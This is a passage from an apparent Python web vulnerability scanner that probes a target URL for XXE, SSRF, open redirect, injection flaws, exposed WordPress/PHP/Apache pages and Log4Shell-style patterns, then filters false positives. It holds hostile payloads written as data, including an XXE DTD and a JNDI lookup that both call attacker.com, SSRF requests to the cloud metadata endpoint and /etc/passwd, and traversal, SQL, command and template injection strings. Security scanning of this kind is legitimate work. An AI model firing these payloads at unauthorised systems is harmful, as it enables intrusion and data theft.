                """<!DOCTYPE data SYSTEM "http://attacker.com/xxe.dtd"><data>&e1;</data>"""
            ]
            
            # Try to find XML endpoints or parameters
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Check if there are parameters that might accept XML
            xml_param_candidates = [p for p in query_params.keys() if any(xml in p.lower() for xml in ['xml', 'data', 'input', 'request'])]
            
            for param_name in xml_param_candidates:
                for payload in xxe_payloads:
                    # Test with XML payload in POST request
                    test_data = {param_name: payload}
                    
                    try:
                        async with session.post(url, data=test_data) as response:
                            content = await response.text()
                            
                            # Check for XXE indicators in response
                            xxe_indicators = [
                                'root:',  # /etc/passwd content
                                '[fonts]',  # win.ini content
                                'uid=',  # id command output
                                'attacker.com',  # External entity reference
                                'ENTITY',  # XML entity reference
                                'DOCTYPE',  # XML doctype
                                'SYSTEM'  # XML external entity
                            ]
                            
                            if any(indicator in content for indicator in xxe_indicators):
                                finding = {
                                    'id': f"xxe_test_{param_name}_{hashlib.md5(payload[:50].encode()).hexdigest()[:8]}",
                                    'type': "XML External Entity (XXE)",
                                    'severity': "critical",
                                    'location': f"Parameter: {param_name}",
                                    'description': "XXE vulnerability detected",
                                    'evidence': "XXE payload triggered response with external entity content",
                                    'confidence': 0.8,
                                    'remediation': "Disable external entity processing in XML parsers"
                                }
                                findings.append(finding)
                                break
                    except Exception as req_error:
                        print(f"XXE test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"XXE test error: {str(e)}")
        
        return findings
    
    async def _test_ssrf(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test for Server-Side Request Forgery (SSRF) vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of SSRF findings
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # SSRF test payloads (internal URLs)
            ssrf_payloads = [
                'http://127.0.0.1',
                'http://localhost',
                'http://169.254.169.254',  # AWS metadata endpoint
                'http://192.168.1.1',
                'http://10.0.0.1',
                'file:///etc/passwd',
                'gopher://localhost:80/_test',
                'dict://localhost:80/'
            ]
            
            # Look for URL parameters that might be vulnerable to SSRF
            url_param_candidates = [p for p in query_params.keys() if any(url_indicator in p.lower() for url_indicator in ['url', 'link', 'image', 'src', 'redirect'])]
            
            for param_name in url_param_candidates:
                for payload in ssrf_payloads:
                    # Build test URL with SSRF payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        async with session.get(test_url) as response:
                            content = await response.text()
                            
                            # Check for internal content that shouldn't be accessible
                            internal_indicators = [
                                'root:',  # /etc/passwd
                                'meta-data',  # AWS metadata
                                'internal',
                                'localhost',
                                '127.0.0.1',
                                'private',
                                'AWS'
                            ]
                            
                            if any(indicator in content for indicator in internal_indicators):
                                finding = {
                                    'id': f"ssrf_test_{param_name}_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                    'type': "Server-Side Request Forgery (SSRF)",
                                    'severity': "high",
                                    'location': f"Parameter: {param_name}",
                                    'description': "SSRF vulnerability detected",
                                    'evidence': f"Server made request to internal resource: {payload}",
                                    'confidence': 0.75,
                                    'remediation': "Validate and restrict URL schemes and destinations"
                                }
                                findings.append(finding)
                                break
                    except Exception as req_error:
                        print(f"SSRF test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"SSRF test error: {str(e)}")
        
        return findings
    
    async def _test_open_redirect(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test for Open Redirect vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of open redirect findings
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Open redirect test payloads
            redirect_payloads = [
                'http://evil.com',
                'https://attacker.example',
                '//evil.com',
                '/\\evil.com',
                'javascript:alert(1)'
            ]
            
            # Look for redirect parameters
            redirect_param_candidates = [p for p in query_params.keys() if any(redirect in p.lower() for redirect in ['redirect', 'url', 'next', 'return', 'goto'])]
            
            for param_name in redirect_param_candidates:
                for payload in redirect_payloads:
                    # Build test URL with redirect payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        async with session.get(test_url, allow_redirects=False) as response:
                            # Check for redirect headers
                            location = response.headers.get('Location', '')
                            
                            # Check if location header contains our malicious payload
                            if payload in location or 'evil.com' in location or 'attacker' in location:
                                finding = {
                                    'id': f"redirect_test_{param_name}_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                    'type': "Open Redirect",
                                    'severity': "medium",
                                    'location': f"Parameter: {param_name}",
                                    'description': "Open redirect vulnerability detected",
                                    'evidence': f"Redirects to external URL: {location}",
                                    'confidence': 0.9,
                                    'remediation': "Validate redirect destinations, use allowlists"
                                }
                                findings.append(finding)
                                break
                    except Exception as req_error:
                        print(f"Open redirect test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"Open redirect test error: {str(e)}")
        
        return findings
    
    async def _behavioral_analysis(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Perform behavioral analysis to detect anomalies
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of behavioral analysis findings
        """
        findings = []
        
        try:
            print("Performing behavioral analysis...")
            
            # Test with malformed requests
            malformed_findings = await self._test_malformed_requests(url, session)
            findings.extend(malformed_findings)
            
            # Test with oversized inputs
            oversized_findings = await self._test_oversized_inputs(url, session)
            findings.extend(oversized_findings)
            
            # Test with special characters
            special_findings = await self._test_special_characters(url, session)
            findings.extend(special_findings)
            
            # Analyze error responses
            error_findings = await self._analyze_error_responses(url, session)
            findings.extend(error_findings)
            
        except Exception as e:
            print(f"Behavioral analysis error: {str(e)}")
        
        return findings
    
    async def _test_malformed_requests(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test with malformed HTTP requests
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of findings from malformed request testing
        """
        findings = []
        
        try:
            # Test with invalid HTTP methods that could be dangerous
            invalid_methods = ['DEBUG', 'TRACE', 'TRACK', 'CONNECT', 'OPTIONS', 'PUT', 'DELETE', 'PATCH']
            
            for method in invalid_methods:
                try:
                    async with session.request(method, url) as response:
                        # Check if dangerous methods are enabled (should return 405 or 501)
                        if response.status != 405 and response.status != 501:  # Not "Method Not Allowed" or "Not Implemented"
                            finding = {
                                'id': f"method_{method}_{hashlib.md5(url.encode()).hexdigest()[:8]}",
                                'type': "Dangerous HTTP Method Enabled",
                                'severity': "medium",
                                'location': "HTTP Configuration",
                                'description': f"HTTP {method} method is enabled",
                                'evidence': f"{method} request returned status {response.status}",
                                'confidence': 0.7,
                                'remediation': "Disable unnecessary HTTP methods"
                            }
                            findings.append(finding)
                except Exception as req_error:
                    print(f"Malformed request test error for method {method}: {req_error}")
                    continue
            
            # Test with potentially spoofable headers
            malformed_headers = {
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1',
                'X-Client-IP': '127.0.0.1',
                'X-Host': '127.0.0.1'
            }
            
            for header_name, header_value in malformed_headers.items():
                headers = {header_name: header_value}
                try:
                    async with session.get(url, headers=headers) as response:
                        # This test would normally compare responses to detect IP spoofing
                        # For now, we just check if the request succeeds
                        pass
                except Exception as req_error:
                    print(f"Header spoofing test error: {req_error}")
                    continue
            
        except Exception as e:
            print(f"Malformed request test error: {str(e)}")
        
        return findings
    
    async def _test_oversized_inputs(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test with oversized inputs to detect buffer overflows or DoS
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of findings from oversized input testing
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            if not query_params:
                return findings  # No parameters to test
            
            # Create very large input values (10KB)
            large_value = 'A' * 10000
            
            for param_name in query_params.keys():
                # Test with large parameter value
                test_params = query_params.copy()
                test_params[param_name] = [large_value]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    test_query,
                    parsed_url.fragment
                ))
                
                try:
                    async with session.get(test_url, timeout=30) as response:
                        # Check for error responses indicating buffer issues
                        if response.status >= 500:
                            finding = {
                                'id': f"oversized_{param_name}_{hashlib.md5(large_value[:100].encode()).hexdigest()[:8]}",
                                'type': "Potential Buffer Overflow/DoS",
                                'severity': "medium",
                                'location': f"Parameter: {param_name}",
                                'description': "Large input caused server error",
                                'evidence': f"10KB input to {param_name} returned status {response.status}",
                                'confidence': 0.6,
                                'remediation': "Implement input size limits and validation"
                            }
                            findings.append(finding)
                except asyncio.TimeoutError:
                    # Timeout might indicate DoS vulnerability
                    finding = {
                        'id': f"oversized_timeout_{param_name}_{hashlib.md5(large_value[:100].encode()).hexdigest()[:8]}",
                        'type': "Potential DoS Vulnerability",
                        'severity': "medium",
                        'location': f"Parameter: {param_name}",
                        'description': "Large input caused timeout",
                        'evidence': f"10KB input to {param_name} caused request timeout",
                        'confidence': 0.5,
                        'remediation': "Implement input size limits and request timeouts"
                    }
                    findings.append(finding)
                except Exception as req_error:
                    print(f"Oversized input test request error: {req_error}")
                    continue
            
        except Exception as e:
            print(f"Oversized input test error: {str(e)}")
        
        return findings
    
    async def _test_special_characters(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test with special characters to detect parsing issues
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of findings from special character testing
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            if not query_params:
                return findings  # No parameters to test
            
            # Special character test values with descriptions
            special_chars = [
                ('"', 'Double quote'),
                ("'", 'Single quote'),
                ('<', 'Less than'),
                ('>', 'Greater than'),
                ('&', 'Ampersand'),
                (';', 'Semicolon'),
                ('|', 'Pipe'),
                ('`', 'Backtick'),
                ('$', 'Dollar'),
                ('(', 'Parenthesis open'),
                (')', 'Parenthesis close'),
                ('{', 'Brace open'),
                ('}', 'Brace close'),
                ('[', 'Bracket open'),
                (']', 'Bracket close'),
                ('\\', 'Backslash'),
                ('/', 'Forward slash'),
                ('%', 'Percent'),
                ('#', 'Hash'),
                ('?', 'Question mark'),
                ('=', 'Equals'),
                ('+', 'Plus'),
                ('*', 'Asterisk'),
                ('~', 'Tilde'),
                ('^', 'Caret'),
                ('@', 'At symbol')
            ]
            
            for param_name in query_params.keys():
                for char, description in special_chars:
                    # Test with special character
                    test_params = query_params.copy()
                    test_params[param_name] = [f'test{char}test']
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        async with session.get(test_url) as response:
                            # Check for error or unusual behavior
                            if response.status >= 500:
                                finding = {
                                    'id': f"special_char_{param_name}_{ord(char)}_{hashlib.md5(url.encode()).hexdigest()[:8]}",
                                    'type': "Special Character Handling Issue",
                                    'severity': "low",
                                    'location': f"Parameter: {param_name}",
                                    'description': "Special character caused server error",
                                    'evidence': f"Character '{char}' ({description}) caused status {response.status}",
                                    'confidence': 0.7,
                                    'remediation': "Implement proper input validation and encoding"
                                }
                                findings.append(finding)
                                break
                    except Exception as req_error:
                        print(f"Special character test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"Special character test error: {str(e)}")
        
        return findings
    
    async def _analyze_error_responses(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Analyze error responses for information disclosure
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of findings from error response analysis
        """
        findings = []
        
        try:
            # Test for common error-inducing inputs
            error_tests = [
                ('../../../../../../etc/passwd', "Path traversal"),
                ("' OR '1'='1", "SQL injection"),
                ('<script>alert(1)</script>', "XSS"),
                ('; ls -la', "Command injection"),
                ('{{7*7}}', "Template injection"),
                ('${7*7}', "Expression language"),
                ('%', "URL encoding error"),
                ('\\', "Path separator"),
                ('*', "Wildcard"),
                ('?', "Wildcard")
            ]
            
            for test_input, description in error_tests:
                test_url = f"{url}{test_input}"
                
                try:
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for stack traces or debug information
                        error_indicators = [
                            'Stack trace',
                            'Exception',
                            'Error',
                            'Warning',
                            'Notice',
                            'at line',
                            'in /',
                            'Traceback',
                            'PHP',
                            'Python',
                            'Java',
                            '.NET',
                            'Microsoft',
                            'Apache',
                            'nginx',
                            'IIS'
                        ]
                        
                        # Check for framework-specific error patterns
                        framework_errors = {
                            'django': ['django', 'csrf', 'settings.DEBUG'],
                            'flask': ['flask', 'werkzeug'],
                            'rails': ['rails', 'ruby'],
                            'spring': ['spring', 'java'],
                            'laravel': ['laravel', 'symfony'],
                            'wordpress': ['wordpress', 'wp-']
                        }
                        
                        error_found = False
                        framework_detected = None
                        
                        # Check for generic error indicators
                        for indicator in error_indicators:
                            if indicator.lower() in content.lower():
                                error_found = True
                                break
                        
                        # Check for framework-specific errors
                        for framework, patterns in framework_errors.items():
                            if any(pattern.lower() in content.lower() for pattern in patterns):
                                framework_detected = framework
                                error_found = True
                                break
                        
                        if error_found:
                            evidence = f"Error information disclosed with {description} input"
                            if framework_detected:
                                evidence += f" ({framework_detected} framework)"
                            
                            finding = {
                                'id': f"error_info_{hashlib.md5(test_input.encode()).hexdigest()[:8]}",
                                'type': "Information Disclosure in Errors",
                                'severity': "medium",
                                'location': "Error Responses",
                                'description': "Detailed error information exposed",
                                'evidence': evidence,
                                'confidence': 0.8,
                                'remediation': "Disable detailed error messages in production"
                            }
                            findings.append(finding)
                            break
                except Exception as req_error:
                    print(f"Error response analysis request error: {req_error}")
                    continue
            
        except Exception as e:
            print(f"Error response analysis error: {str(e)}")
        
        return findings
    
    async def _application_fingerprinting(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Fingerprint application and check for known vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of findings from application fingerprinting
        """
        findings = []
        
        try:
            print("Fingerprinting application...")
            
            # Make initial request to analyze
            async with session.get(url) as response:
                content = await response.text()
                headers = response.headers
                
                # Check headers for technology indicators
                tech_indicators = self._analyze_tech_indicators(headers, content)
                
                for tech, confidence in tech_indicators.items():
                    if confidence > 0.7:
                        # Check for known vulnerabilities for this technology
                        vuln_findings = self._check_tech_vulnerabilities(tech, url, session)
                        findings.extend(vuln_findings)
                
                # Check for common application signatures
                app_signatures = self._check_application_signatures(content)
                
                for app, evidence in app_signatures.items():
                    finding = {
                        'id': f"app_fingerprint_{app}_{hashlib.md5(url.encode()).hexdigest()[:8]}",
                        'type': "Application Identified",
                        'severity': "informational",
                        'location': "Application Stack",
                        'description': f"Identified {app} application",
                        'evidence': evidence,
                        'confidence': 0.9,
                        'remediation': "Keep application updated with security patches"
                    }
                    findings.append(finding)
            
        except Exception as e:
            print(f"Application fingerprinting error: {str(e)}")
        
        return findings
    
    def _analyze_tech_indicators(self, headers: Dict[str, str], content: str) -> Dict[str, float]:
        """
        Analyze technology indicators from headers and content
        
        Args:
            headers: HTTP response headers
            content: Response content
            
        Returns:
            Dictionary of technology -> confidence pairs
        """
        tech_indicators = {}
        
        # Check headers for technology hints
        server_header = headers.get('Server', '').lower()
        powered_by = headers.get('X-Powered-By', '').lower()
        
        # Server header analysis
        if 'apache' in server_header:
            tech_indicators['Apache'] = 0.9
        if 'nginx' in server_header:
            tech_indicators['Nginx'] = 0.9
        if 'iis' in server_header:
            tech_indicators['IIS'] = 0.9
        
        # X-Powered-By analysis
        if 'php' in powered_by:
            tech_indicators['PHP'] = 0.8
        if 'asp.net' in powered_by:
            tech_indicators['ASP.NET'] = 0.8
        if 'node.js' in powered_by:
            tech_indicators['Node.js'] = 0.8
        
        # Content analysis for framework detection
        content_lower = content.lower()
        
        # CMS detection
        if 'wp-content' in content_lower or 'wordpress' in content_lower:
            tech_indicators['WordPress'] = 0.95
        if 'drupal' in content_lower:
            tech_indicators['Drupal'] = 0.95
        if 'joomla' in content_lower:
            tech_indicators['Joomla'] = 0.95
        
        # JavaScript framework detection
        if 'react' in content_lower or 'react-dom' in content_lower:
            tech_indicators['React'] = 0.8
        if 'vue' in content_lower or 'vue.js' in content_lower:
            tech_indicators['Vue.js'] = 0.8
        if 'angular' in content_lower:
            tech_indicators['Angular'] = 0.8
        
        # Database indicators
        if 'mysql' in content_lower:
            tech_indicators['MySQL'] = 0.7
        if 'postgresql' in content_lower:
            tech_indicators['PostgreSQL'] = 0.7
        if 'mongodb' in content_lower:
            tech_indicators['MongoDB'] = 0.7
        
        return tech_indicators
    
    def _check_application_signatures(self, content: str) -> Dict[str, str]:
        """
        Check for specific application signatures
        
        Args:
            content: Response content
            
        Returns:
            Dictionary of application -> evidence
        """
        signatures = {}
        content_lower = content.lower()
        
        # CMS signatures with their identifying patterns
        cms_patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress', '/wp-admin/'],
            'Joomla': ['joomla', 'com_', 'index.php?option='],
            'Drupal': ['drupal', 'sites/all/', '/node/', '/user/'],
            'Magento': ['magento', '/skin/frontend/', '/media/catalog/'],
            'Shopify': ['shopify', 'cdn.shopify.com'],
            'Wix': ['wix.com', 'static.parastorage.com'],
            'Squarespace': ['squarespace', 'static.squarespace.com']
        }
        
        # Check for CMS signatures
        for cms, patterns in cms_patterns.items():
            if any(pattern in content_lower for pattern in patterns):
                signatures[cms] = f"Found {cms} signature in content"
        
        # Framework signatures
        framework_patterns = {
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrfmiddlewaretoken'],
            'Rails': ['rails', 'csrf-param'],
            'Spring': ['spring', 'org.springframework'],
            'Express': ['express', 'x-powered-by: express']
        }
        
        # Check for framework signatures
        for framework, patterns in framework_patterns.items():
            if any(pattern in content_lower for pattern in patterns):
                signatures[framework] = f"Found {framework} signature in content"
        
        return signatures
    
    async def _check_tech_vulnerabilities(self, technology: str, url: str, 
                                         session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Check for known vulnerabilities for a specific technology
        
        Args:
            technology: Technology name
            url: Target URL
            session: HTTP session
            
        Returns:
            List of technology-specific vulnerability findings
        """
        findings = []
        
        try:
            # WordPress specific checks
            if technology.lower() == 'wordpress':
                wp_findings = await self._check_wordpress_vulnerabilities(url, session)
                findings.extend(wp_findings)
            
            # PHP specific checks
            elif technology.lower() == 'php':
                php_findings = await self._check_php_vulnerabilities(url, session)
                findings.extend(php_findings)
            
            # Apache specific checks
            elif technology.lower() == 'apache':
                apache_findings = await self._check_apache_vulnerabilities(url, session)
                findings.extend(apache_findings)
            
        except Exception as e:
            print(f"Technology vulnerability check error for {technology}: {str(e)}")
        
        return findings
    
    async def _check_wordpress_vulnerabilities(self, url: str, 
                                              session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Check for WordPress-specific vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of WordPress vulnerability findings
        """
        findings = []
        
        try:
            # Common WordPress vulnerable endpoints
            wp_endpoints = [
                '/wp-admin/',
                '/wp-content/',
                '/wp-includes/',
                '/wp-login.php',
                '/xmlrpc.php',
                '/wp-config.php',
                '/readme.html',
                '/license.txt'
            ]
            
            parsed_url = urllib.parse.urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for endpoint in wp_endpoints:
                test_url = urllib.parse.urljoin(base_url, endpoint)
                
                try:
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        if response.status < 400:  # If endpoint is accessible
                            # WordPress readme disclosure
                            if endpoint == '/readme.html' and 'wordpress' in content.lower():
                                finding = {
                                    'id': f"wp_readme_{hashlib.md5(test_url.encode()).hexdigest()[:8]}",
                                    'type': "WordPress Information Disclosure",
                                    'severity': "low",
                                    'location': endpoint,
                                    'description': "WordPress readme file accessible",
                                    'evidence': f"WordPress readme accessible at {test_url}",
                                    'confidence': 0.9,
                                    'remediation': "Remove readme.html file from production"
                                }
                                findings.append(finding)
                            
                            # WordPress XML-RPC enabled (can be used for brute force)
                            if endpoint == '/xmlrpc.php' and 'XML-RPC server accepts POST requests' in content:
                                finding = {
                                    'id': f"wp_xmlrpc_{hashlib.md5(test_url.encode()).hexdigest()[:8]}",
                                    'type': "WordPress XML-RPC Enabled",
                                    'severity': "medium",
                                    'location': endpoint,
                                    'description': "WordPress XML-RPC interface enabled",
                                    'evidence': f"XML-RPC accessible at {test_url}",
                                    'confidence': 0.9,
                                    'remediation': "Disable XML-RPC if not needed"
                                }
                                findings.append(finding)
                except Exception as req_error:
                    print(f"WordPress check request error: {req_error}")
                    continue
            
        except Exception as e:
            print(f"WordPress check error: {str(e)}")
        
        return findings
    
    async def _check_php_vulnerabilities(self, url: str, 
                                        session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Check for PHP-specific vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of PHP vulnerability findings
        """
        findings = []
        
        try:
            # Common PHP vulnerable endpoints
            php_endpoints = [
                '/phpinfo.php',
                '/test.php',
                '/info.php',
                '/phpinfo',
                '/server-info',
                '/server-status'
            ]
            
            parsed_url = urllib.parse.urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for endpoint in php_endpoints:
                test_url = urllib.parse.urljoin(base_url, endpoint)
                
                try:
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        if response.status < 400:  # If endpoint is accessible
                            # PHP info disclosure
                            if 'phpinfo' in content.lower() or 'php version' in content.lower():
                                finding = {
                                    'id': f"php_info_{hashlib.md5(test_url.encode()).hexdigest()[:8]}",
                                    'type': "PHP Information Disclosure",
                                    'severity': "medium",
                                    'location': endpoint,
                                    'description': "PHP info file accessible",
                                    'evidence': f"PHP information accessible at {test_url}",
                                    'confidence': 0.9,
                                    'remediation': "Remove phpinfo files from production"
                                }
                                findings.append(finding)
                except Exception as req_error:
                    print(f"PHP check request error: {req_error}")
                    continue
            
        except Exception as e:
            print(f"PHP check error: {str(e)}")
        
        return findings
    
    async def _check_apache_vulnerabilities(self, url: str, 
                                           session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Check for Apache-specific vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of Apache vulnerability findings
        """
        findings = []
        
        try:
            # Common Apache status endpoints
            apache_endpoints = [
                '/server-status',
                '/server-info',
                '/status',
                '/apache-status'
            ]
            
            parsed_url = urllib.parse.urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for endpoint in apache_endpoints:
                test_url = urllib.parse.urljoin(base_url, endpoint)
                
                try:
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        if response.status < 400:  # If endpoint is accessible
                            # Apache server status
                            if 'server-status' in content.lower() or 'apache status' in content.lower():
                                finding = {
                                    'id': f"apache_status_{hashlib.md5(test_url.encode()).hexdigest()[:8]}",
                                    'type': "Apache Information Disclosure",
                                    'severity': "medium",
                                    'location': endpoint,
                                    'description': "Apache server status accessible",
                                    'evidence': f"Apache status accessible at {test_url}",
                                    'confidence': 0.9,
                                    'remediation': "Restrict access to server status pages"
                                }
                                findings.append(finding)
                except Exception as req_error:
                    print(f"Apache check request error: {req_error}")
                    continue
            
        except Exception as e:
            print(f"Apache check error: {str(e)}")
        
        return findings
    
    async def _cve_pattern_matching(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Check for patterns matching known CVE vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of CVE pattern findings
        """
        findings = []
        
        try:
            print("Checking for known CVE patterns...")
            
            # Test each CVE pattern
            for cve_id, cve_info in self.cve_patterns.items():
                pattern = cve_info['pattern']
                severity = cve_info['severity']
                description = cve_info['description']
                
                # Create test payload based on CVE pattern
                if 'jndi' in pattern.lower():
                    test_payload = '${jndi:ldap://attacker.com/test}'
                elif 'content-type' in pattern.lower():
                    test_payload = 'Content-Type: %{#test}'
                else:
                    continue  # Skip patterns that need specific context
                
                # Test with payload in different contexts
                parsed_url = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                
                for param_name in query_params.keys():
                    test_params = query_params.copy()
                    test_params[param_name] = [test_payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        async with session.get(test_url) as response:
                            content = await response.text()
                            
                            # Check if payload triggered any response
                            if 'attacker.com' in content or 'jndi' in content:
                                finding = {
                                    'id': f"cve_{cve_id}_{hashlib.md5(param_name.encode()).hexdigest()[:8]}",
                                    'type': f"Potential {cve_id} Vulnerability",
                                    'severity': severity,
                                    'location': f"Parameter: {param_name}",
                                    'description': description,
                                    'evidence': "CVE pattern matched in response",
                                    'confidence': 0.6,
                                    'remediation': f"Apply patch for {cve_id}, update affected software"
                                }
                                findings.append(finding)
                    except Exception as req_error:
                        print(f"CVE pattern matching request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"CVE pattern matching error: {str(e)}")
        
        return findings
    
    def _filter_false_positives(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Filter out likely false positives
        
        Args:
            findings: List of raw findings
            
        Returns:
            Filtered list of findings
        """
        filtered_findings = []
        
        for finding in findings:
            # Skip if evidence matches false positive patterns
            evidence = finding.get('evidence', '').lower()
            
            is_false_positive = False
            for fp_pattern in self.false_positive_patterns:
                if re.search(fp_pattern, evidence, re.IGNORECASE):
                    is_false_positive = True
                    break
            
            # Skip if location matches whitelist patterns
            location = finding.get('location', '').lower()
            for whitelist_pattern in self.whitelist_patterns:
                if re.search(whitelist_pattern, location, re.IGNORECASE):
                    is_false_positive = True
                    break
            
            if not is_false_positive:
                filtered_findings.append(finding)
        
        return filtered_findings